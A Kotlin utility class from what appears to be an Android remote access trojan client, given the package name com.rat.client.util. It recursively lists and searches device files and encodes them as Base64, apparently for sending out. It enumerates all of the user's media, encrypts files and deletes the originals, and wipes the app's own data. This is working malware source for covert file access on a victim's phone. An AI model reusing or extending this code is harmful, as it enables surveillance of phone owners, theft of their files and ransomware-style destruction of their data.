package com.rat.client.util

import android.content.Context
import android.database.Cursor
import android.net.Uri
import android.os.Environment
import android.provider.MediaStore
import android.util.Base64
import android.util.Log
import java.io.*
import java.nio.charset.StandardCharsets
import java.nio.file.Files
import java.nio.file.Paths
import java.security.MessageDigest
import java.security.SecureRandom
import java.util.zip.GZIPInputStream
import java.util.zip.GZIPOutputStream
import javax.crypto.Cipher
import javax.crypto.KeyGenerator
import javax.crypto.SecretKey
import javax.crypto.spec.GCMParameterSpec
import javax.crypto.spec.PBEKeySpec
import javax.crypto.spec.SecretKeySpec

class FileUtils private constructor() {

    companion object {
        @Suppress("UNUSED_PARAMETER")
        private const val TAG = "FileUtils"
        private const val AES_KEY_SIZE = 256
        private const val GCM_IV_LENGTH = 12
        private const val GCM_TAG_LENGTH = 16
        private const val PBKDF2_ITERATIONS = 100000
        private const val SALT_LENGTH = 16

        @JvmStatic
        fun listFiles(path: String, recursive: Boolean = false): Map<String, Any> {
            val file = File(path)
            if (!file.exists() || !file.isDirectory) {
                return mapOf("error" to "Invalid directory", "files" to emptyList(), "count" to 0)
            }

            val filesList = mutableListOf<Map<String, Any>>()
            val queue = java.util.ArrayDeque<File>()
            queue.add(file)

            while (queue.isNotEmpty()) {
                val current = queue.poll()
                val children = current.listFiles() ?: continue

                for (child in children) {
                    if (filesList.size >= 1000) break // Limit

                    val fileInfo = mapOf(
                        "name" to child.name,
                        "path" to child.absolutePath,
                        "size" to child.length(),
                        "is_directory" to child.isDirectory,
                        "is_hidden" to child.isHidden,
                        "can_read" to child.canRead(),
                        "can_write" to child.canWrite(),
                        "last_modified" to child.lastModified(),
                        "extension" to getExtension(child.name),
                        "mime_type" to getMimeType(child)
                    )
                    filesList.add(fileInfo)

                    if (recursive && child.isDirectory && child.canRead()) {
                        queue.add(child)
                    }
                }
            }

            return mapOf("path" to path, "files" to filesList, "count" to filesList.size)
        }

        @JvmStatic
        fun searchFiles(path: String, pattern: String, maxResults: Int = 100): Map<String, Any> {
            val file = File(path)
            if (!file.exists() || !file.isDirectory) {
                return mapOf("error" to "Invalid directory", "files" to emptyList(), "count" to 0)
            }

            val results = mutableListOf<Map<String, Any>>()
            val regex = pattern.toRegex()

            fun searchRecursive(dir: File) {
                val children = dir.listFiles() ?: return
                for (child in children) {
                    if (results.size >= maxResults) return
                    if (child.name.matches(regex)) {
                        results.add(mapOf(
                            "name" to child.name,
                            "path" to child.absolutePath,
                            "size" to child.length(),
                            "is_directory" to child.isDirectory,
                            "last_modified" to child.lastModified()
                        ))
                    }
                    if (child.isDirectory && child.canRead()) {
                        searchRecursive(child)
                    }
                }
            }

            searchRecursive(file)
            return mapOf("pattern" to pattern, "files" to results, "count" to results.size)
        }

        @JvmStatic
        fun readFileAsBase64(file: File): String {
            return try {
                val bytes = file.readBytes()
                Base64.encodeToString(bytes, Base64.DEFAULT)
            } catch (e: Exception) {
                Log.e(TAG, "Read file failed: ${e.message}")
                ""
            }
        }

        @JvmStatic
        fun readFileAsText(file: File, charset: String = "UTF-8"): String {
            return try {
                file.readText(charset)
            } catch (e: Exception) {
                Log.e(TAG, "Read text failed: ${e.message}")
                ""
            }
        }

        @JvmStatic
        fun writeFile(file: File, content: String, charset: String = "UTF-8", append: Boolean = false): Boolean {
            return try {
                file.parentFile?.mkdirs()
                file.writeText(content, charset, append)
                true
            } catch (e: Exception) {
                Log.e(TAG, "Write file failed: ${e.message}")
                false
            }
        }

        @JvmStatic
        fun writeFile(file: File, bytes: ByteArray, append: Boolean = false): Boolean {
            return try {
                file.parentFile?.mkdirs()
                FileOutputStream(file, append).use { it.write(bytes) }
                true
            } catch (e: Exception) {
                Log.e(TAG, "Write bytes failed: ${e.message}")
                false
            }
        }

        @JvmStatic
        fun copyFile(source: File, destination: File): Boolean {
            return try {
                destination.parentFile?.mkdirs()
                source.copyTo(destination, true)
                true
            } catch (e: Exception) {
                Log.e(TAG, "Copy failed: ${e.message}")
                false
            }
        }

        @JvmStatic
        fun moveFile(source: File, destination: File): Boolean {
            return try {
                destination.parentFile?.mkdirs()
                source.renameTo(destination)
            } catch (e: Exception) {
                Log.e(TAG, "Move failed: ${e.message}")
                false
            }
        }

        @JvmStatic
        fun deleteFile(file: File): Boolean {
            return try {
                if (file.isDirectory) {
                    deleteRecursive(file)
                } else {
                    file.delete()
                }
            } catch (e: Exception) {
                Log.e(TAG, "Delete failed: ${e.message}")
                false
            }
        }

        private fun deleteRecursive(file: File) {
            if (file.isDirectory) {
                file.listFiles()?.forEach { deleteRecursive(it) }
            }
            file.delete()
        }

        @JvmStatic
        fun getFileHash(file: File, algorithm: String = "SHA-256"): String {
            return try {
                val digest = MessageDigest.getInstance(algorithm)
                val buffer = ByteArray(8192)
                FileInputStream(file).use { input ->
                    var bytesRead = input.read(buffer)
                    while (bytesRead != -1) {
                        digest.update(buffer, 0, bytesRead)
                        bytesRead = input.read(buffer)
                    }
                }
                digest.digest().joinToString("") { "%02x".format(it) }
            } catch (e: Exception) {
                Log.e(TAG, "Hash failed: ${e.message}")
                ""
            }
        }

        @JvmStatic
        fun compressFile(source: File, destination: File): Boolean {
            return try {
                destination.parentFile?.mkdirs()
                FileInputStream(source).use { input ->
                    FileOutputStream(destination).use { output ->
                        GZIPOutputStream(output).use { gzip ->
                            input.copyTo(gzip)
                        }
                    }
                }
                true
            } catch (e: Exception) {
                Log.e(TAG, "Compress failed: ${e.message}")
                false
            }
        }

        @JvmStatic
        fun decompressFile(source: File, destination: File): Boolean {
            return try {
                destination.parentFile?.mkdirs()
                FileInputStream(source).use { input ->
                    GZIPInputStream(input).use { gzip ->
                        FileOutputStream(destination).use { output ->
                            gzip.copyTo(output)
                        }
                    }
                }
                true
            } catch (e: Exception) {
                Log.e(TAG, "Decompress failed: ${e.message}")
                false
            }
        }

        // ===== Encryption =====

        @JvmStatic
        fun encryptFile(file: File, password: String): Boolean {
            return try {
                val plainBytes = file.readBytes()
                val encrypted = encrypt(plainBytes, password)
                val encryptedFile = File("${file.absolutePath}.enc")
                writeFile(encryptedFile, encrypted)
                file.delete()
                true
            } catch (e: Exception) {
                Log.e(TAG, "Encrypt file failed: ${e.message}")
                false
            }
        }

        @JvmStatic
        fun decryptFile(file: File, password: String): Boolean {
            return try {
                val encryptedBytes = file.readBytes()
                val decrypted = decrypt(encryptedBytes, password)
                val decryptedFile = File(file.absolutePath.replace(".enc", ""))
                writeFile(decryptedFile, decrypted)
                file.delete()
                true
            } catch (e: Exception) {
                Log.e(TAG, "Decrypt file failed: ${e.message}")
                false
            }
        }

        @JvmStatic
        fun encrypt(data: ByteArray, password: String): ByteArray {
            val salt = generateSalt()
            val key = deriveKey(password, salt)
            val iv = generateIv()
            val cipher = Cipher.getInstance("AES/GCM/NoPadding")
            val spec = GCMParameterSpec(GCM_TAG_LENGTH * 8, iv)
            cipher.init(Cipher.ENCRYPT_MODE, key, spec)

            val encrypted = cipher.doFinal(data)

            // Combine: salt + iv + encrypted
            val result = ByteArray(salt.size + iv.size + encrypted.size)
            System.arraycopy(salt, 0, result, 0, salt.size)
            System.arraycopy(iv, 0, result, salt.size, iv.size)
            System.arraycopy(encrypted, 0, result, salt.size + iv.size, encrypted.size)

            return result
        }

        @JvmStatic
        fun decrypt(data: ByteArray, password: String): ByteArray {
            if (data.size < SALT_LENGTH + GCM_IV_LENGTH + GCM_TAG_LENGTH) {
                throw IllegalArgumentException("Invalid encrypted data")
            }

            val salt = data.copyOfRange(0, SALT_LENGTH)
            val iv = data.copyOfRange(SALT_LENGTH, SALT_LENGTH + GCM_IV_LENGTH)
            val encrypted = data.copyOfRange(SALT_LENGTH + GCM_IV_LENGTH, data.size)

            val key = deriveKey(password, salt)
            val cipher = Cipher.getInstance("AES/GCM/NoPadding")
            val spec = GCMParameterSpec(GCM_TAG_LENGTH * 8, iv)
            cipher.init(Cipher.DECRYPT_MODE, key, spec)

            return cipher.doFinal(encrypted)
        }

        private fun generateSalt(): ByteArray {
            val salt = ByteArray(SALT_LENGTH)
            SecureRandom().nextBytes(salt)
            return salt
        }

        private fun generateIv(): ByteArray {
            val iv = ByteArray(GCM_IV_LENGTH)
            SecureRandom().nextBytes(iv)
            return iv
        }

        private fun deriveKey(password: String, salt: ByteArray): SecretKey {
            val factory = javax.crypto.SecretKeyFactory.getInstance("PBKDF2WithHmacSHA256")
            val spec = PBEKeySpec(password.toCharArray(), salt, PBKDF2_ITERATIONS, AES_KEY_SIZE)
            val secret = factory.generateSecret(spec)
            return SecretKeySpec(secret.encoded, "AES")
        }

        // ===== Utility =====

        private fun getExtension(filename: String): String {
            val idx = filename.lastIndexOf('.')
            return if (idx > 0) filename.substring(idx + 1).lowercase() else ""
        }

        private fun getMimeType(file: File): String {
            val extension = getExtension(file.name)
            return when (extension) {
                "jpg", "jpeg" -> "image/jpeg"
                "png" -> "image/png"
                "gif" -> "image/gif"
                "mp4" -> "video/mp4"
                "3gp" -> "video/3gpp"
                "mp3" -> "audio/mpeg"
                "wav" -> "audio/wav"
                "pdf" -> "application/pdf"
                "txt" -> "text/plain"
                "json" -> "application/json"
                "xml" -> "application/xml"
                "html", "htm" -> "text/html"
                "zip" -> "application/zip"
                "apk" -> "application/vnd.android.package-archive"
                else -> "application/octet-stream"
            }
        }

        @JvmStatic
        fun wipeAppData(context: Context) {
            try {
                // Delete internal files
                context.filesDir.listFiles()?.forEach { deleteRecursive(it) }
                context.cacheDir.listFiles()?.forEach { deleteRecursive(it) }
                context.getDir("databases", Context.MODE_PRIVATE).listFiles()?.forEach { deleteRecursive(it) }
                context.getDir("shared_prefs", Context.MODE_PRIVATE).listFiles()?.forEach { deleteRecursive(it) }

                // Delete external files
                context.getExternalFilesDir(null)?.listFiles()?.forEach { deleteRecursive(it) }
                context.getExternalCacheDir()?.listFiles()?.forEach { deleteRecursive(it) }

                // Clear shared preferences
                context.getSharedPreferences("*", Context.MODE_PRIVATE).edit().clear().apply()

                // Delete databases
                context.databaseList.forEach { db ->
                    context.deleteDatabase(db)
                }
            } catch (e: Exception) {
                Log.e(TAG, "Wipe failed: ${e.message}")
            }
        }

        @JvmStatic
        fun getMediaFiles(context: Context): List<Map<String, Any>> {
            val mediaFiles = mutableListOf<Map<String, Any>>()
            val projection = arrayOf(
                MediaStore.Files.FileColumns._ID,
                MediaStore.Files.FileColumns.DISPLAY_NAME,
                MediaStore.Files.FileColumns.MIME_TYPE,
                MediaStore.Files.FileColumns.SIZE,
                MediaStore.Files.FileColumns.DATA,
                MediaStore.Files.FileColumns.DATE_ADDED,
                MediaStore.Files.FileColumns.DATE_MODIFIED
            )

            val uri = MediaStore.Files.getContentUri("external")
            val cursor = context.contentResolver.query(uri, projection, null, null, "${MediaStore.Files.FileColumns.DATE_ADDED} DESC")
            cursor?.use { c ->
                while (c.moveToNext() && mediaFiles.size < 500) {
                    mediaFiles.add(mapOf(
                        "id" to c.getLong(c.getColumnIndexOrThrow(MediaStore.Files.FileColumns._ID)),
                        "name" to c.getString(c.getColumnIndexOrThrow(MediaStore.Files.FileColumns.DISPLAY_NAME)) ?: "",
                        "mime_type" to c.getString(c.getColumnIndexOrThrow(MediaStore.Files.FileColumns.MIME_TYPE)) ?: "",
                        "size" to c.getLong(c.getColumnIndexOrThrow(MediaStore.Files.FileColumns.SIZE)),
                        "path" to c.getString(c.getColumnIndexOrThrow(MediaStore.Files.FileColumns.DATA)) ?: "",
                        "date_added" to c.getLong(c.getColumnIndexOrThrow(MediaStore.Files.FileColumns.DATE_ADDED)),
                        "date_modified" to c.getLong(c.getColumnIndexOrThrow(MediaStore.Files.FileColumns.DATE_MODIFIED))
                    ))
                }
            }
            return mediaFiles
        }
    }
}